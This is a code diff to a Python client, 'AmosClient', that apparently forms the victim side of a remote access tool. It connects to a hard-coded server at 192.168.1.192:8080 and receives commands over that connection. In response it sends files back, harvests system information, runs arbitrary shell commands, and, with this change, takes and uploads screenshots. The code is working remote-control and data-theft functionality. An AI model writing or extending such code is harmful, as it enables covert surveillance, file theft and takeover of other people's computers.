@@ -1,6 +1,7 @@
 from urllib import request, parse
 from ServerHandler import ServerHandler
 from DataHarvester import DataHarvester
+from GeneralFeatures import GeneralFeatures
 import subprocess
 import time
 import os
@@ -16,6 +17,7 @@ class AmosClient:
         self.port = port
         self.server_handler = ServerHandler(ip, port)
         self.data_harvester = DataHarvester()
+        self.general_features = GeneralFeatures()
 
 
 
@@ -46,27 +48,33 @@ class AmosClient:
                 break
 
             # Send file
-            if 'get' in command:
+            elif 'get' in command:
                 self.server_handler.send_file(command)
                 continue
 
             # Send file
-            if command == "connected":
+            elif command == "connected":
                 self.server_handler.send_data("active")
                 continue
 
-            if command == "sys_info":
+            elif command == "sys_info":
                 system_info = self.data_harvester.get_platform_info()
                 print(system_info)
                 self.server_handler.send_data(system_info)
                 continue
 
-            self.server_handler.run_command(command)
-            time.sleep(1)
+            elif command == "screenshot":
+                self.general_features.screenshot()
+                self.server_handler.send_file("screenshot.png")
+                if os.path.isfile("screenshot.png"):
+                    os.remove("screenshot.png")
 
+
+            else:
+                self.server_handler.run_command(command)
+                time.sleep(1)
 
 
 
 client = AmosClient("192.168.1.192", 8080)
 client.start()
-
